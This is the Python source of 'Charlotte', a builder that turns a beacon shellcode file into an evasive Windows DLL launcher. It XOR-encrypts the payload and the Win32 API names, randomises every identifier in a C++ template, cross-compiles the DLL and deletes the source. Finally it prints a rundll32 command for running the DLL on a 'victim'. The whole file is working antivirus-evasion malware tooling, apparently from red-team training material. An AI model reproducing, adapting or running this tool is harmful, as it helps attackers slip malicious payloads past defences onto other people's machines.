#!/usr/bin/env python3
import sys
import random
import string
import os
import time

def get_random_string():
    # With combination of lower and upper case
    length = random.randint(8, 15)
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    # print random string
    return result_str

def xor(data):
    
    key = get_random_string()
    l = len(key)
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        o = lambda x: x if isinstance(x, int) else ord(x) # handle data being bytes not string
        output_str += chr(o(current) ^ ord(current_key))

    ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
    return ciphertext, key


def charlotte():
    try:
        plaintext = open("beacon.bin", "rb").read() # read as bytes to deal with charset parsing issues
    except:
        print("[*]                    Failed to read beacon.bin :(                [*]")
        print("[*]                    Missing beacon.bin in pwd?                  [*]")
        sys.exit(1) # exit if read failed
    f1 = "VirtualAlloc"
    f2 = "VirtualProtect"
    f3 = "CreateThread"
    f4 = "WaitForSingleObject"

    e1 = get_random_string()
    calc_name = get_random_string()
    va_name = get_random_string()
    vp_name = get_random_string()
    ct_name = get_random_string()
    wfso_name = get_random_string()

    pl_key_name = get_random_string()
    va_key_name = get_random_string()
    vp_key_name = get_random_string()
    ct_key_name = get_random_string()
    wfso_key_name = get_random_string()

    pl_key_size = get_random_string()
    va_key_size = get_random_string()
    vp_key_size = get_random_string()
    ct_key_size = get_random_string()
    wfso_key_size = get_random_string()

    pva = get_random_string()
    pvp = get_random_string()
    pct = get_random_string()
    pwfso = get_random_string()

    p_execmem = get_random_string()
    p_rvba = get_random_string()
    p_thba = get_random_string()
    p_oldprotect = get_random_string()

    xor_name = get_random_string()

    print("[*]                    Generating XOR Keys...                      [*]")
    ciphertext, pl_key = xor(plaintext)
    ciphertext1, va_key = xor(f1)
    ciphertext2, vp_key = xor(f2)
    ciphertext3, ct_key = xor(f3)
    ciphertext4, wfso_key = xor(f4)


    template = open("template.cpp", "rt")
    data = template.read()
    print("[*]                    Replacing data in template.cpp...           [*]")
    time.sleep(1)
    data = data.replace('RunME', e1)

    data = data.replace('unsigned char calc_payload[] = { };', 'unsigned char calc_payload[] = ' + ciphertext)
    data = data.replace('unsigned char virtual_alloc[] = { };', 'unsigned char virtual_alloc[] = ' + ciphertext1)
    data = data.replace('unsigned char virtual_protect[] = { };', 'unsigned char virtual_protect[] = ' + ciphertext2)
    data = data.replace('unsigned char createthread[] = { };', 'unsigned char createthread[] = ' + ciphertext3)
    data = data.replace('unsigned char waitforsingleobject[] = { };', 'unsigned char waitforsingleobject[] = ' + ciphertext4)

    data = data.replace('char pl_key[] = "";', 'char pl_key[] = "' + pl_key + '";')
    data = data.replace('char va_key[] = "";', 'char va_key[] = "' + va_key + '";')
    data = data.replace('char vp_key[] = "";', 'char vp_key[] = "' + vp_key + '";')
    data = data.replace('char ct_key[] = "";', 'char ct_key[] = "' + ct_key + '";')
    data = data.replace('char wfso_key[] = "";', 'char wfso_key[] = "' + wfso_key + '";')

    data = data.replace('calc_payload', calc_name)
    data = data.replace('virtual_alloc', va_name)
    data = data.replace('virtual_protect', vp_name)
    data = data.replace('createthread', ct_name)
    data = data.replace('waitforsingleobject', wfso_name)

    data = data.replace('pl_key', pl_key_name)
    data = data.replace('va_key', va_key_name)
    data = data.replace('vp_key', vp_key_name)
    data = data.replace('ct_key', ct_key_name)
    data = data.replace('wfso_key', wfso_key_name)

    data = data.replace('calc_len', pl_key_size)
    data = data.replace('va_len', va_key_size)
    data = data.replace('vp_len', vp_key_size)
    data = data.replace('ct_len', ct_key_size)
    data = data.replace('wfso_len', wfso_key_size)

    data = data.replace('pVirtualAlloc', pva)
    data = data.replace('pVirtualProtect', pvp)
    data = data.replace('pCreateThread', pct)
    data = data.replace('pWaitForSingleObject', pwfso)

    data = data.replace('exec_mem', p_execmem)
    data = data.replace('rvba', p_rvba)
    data = data.replace('thba', p_thba)
    data = data.replace('oldprotect', p_oldprotect)

    data = data.replace('XOR', xor_name)

    template.close()
    template = open("charlotte.cpp", "w+")
    template.write(data)
    time.sleep(1)
    print("[*]                    charlotte.cpp generated!                    [*]")
    time.sleep(1)

    template.close
    return e1

banner = """

 ------------------------------------------------------------------------------------------
 |											  |
 |   ####     #    #      ##      #####     #          ####     #####    #####    ######  |
 |  #    #    #    #     #  #     #    #    #         #    #      #        #      #       |
 |  #         ######    #    #    #    #    #         #    #      #        #      #####   |
 |  #         #    #    ######    #####     #         #    #      #        #      #       |
 |  #    #    #    #    #    #    #   #     #         #    #      #        #      #       |
 |   ####     #    #    #    #    #    #    ######     ####       #        #      ######  |
 |                                                                                        |
 ------------------------------------------------------------------------------------------

# v1.1

#####################################################################################################
#												    #
#  Author: Jinkun Ong @https://twitter.com/sec_9emin1				 	            #
#												    #
#			       									    #
#  C++ .DLL shellcode launcher with - 								    #
#	   - dynamic calling of Win32 API calls, 						    #
#	   - payload encryption in XOR, encrypted Win32 API calls naming		 	    #
#	   - randomised function, variable names, export entry point				    #
#	   - fully dynamic per build								    #
#												    #
#  ** References:										    #
#   Many thanks to Sektor7 Red Team Operator: Malware Development Essentials Course - Recommended   #
#   (https://institute.sektor7.net/red-team-operator-malware-development-essentials)		    #
#								   				    #
#####################################################################################################

"""

def main():
    
    print(banner)

    time.sleep(3)
    try:
        print("[*]                    Initialising charlotte()                    [*]")
        time.sleep(1)
        e1 = charlotte()
    except:
        print("[*]                    charlotte() failed? :(                      [*]")
        sys.exit(1) # exit if code generation failed
    print("[*]                    Completed - Compiling charlotte.dll         [*]")
    time.sleep(1)
    try:
        os.system("x86_64-w64-mingw32-g++ -shared -o charlotte.dll charlotte.cpp -fpermissive >/dev/null 2>&1")
        print("[*]                    Cross Compile Success!                      [*]")
    except:
        print("[*]                    Compilation failed :(                       [*]")
    time.sleep(1)
    print("[*]                    Removing charlotte.cpp...                   [*]")
    os.system("rm charlotte.cpp")
    time.sleep(1)
    print("[*]                    Execute on your Windows x64 victim with:    [*]")
    print("[*]                    C:\Windows\System32\rundll32.exe C:\Users\Public\Desktop\charlotte.dll, " + e1 + "    [*]")
    time.sleep(2)
    print("\n")

if __name__ == "__main__":
    main()

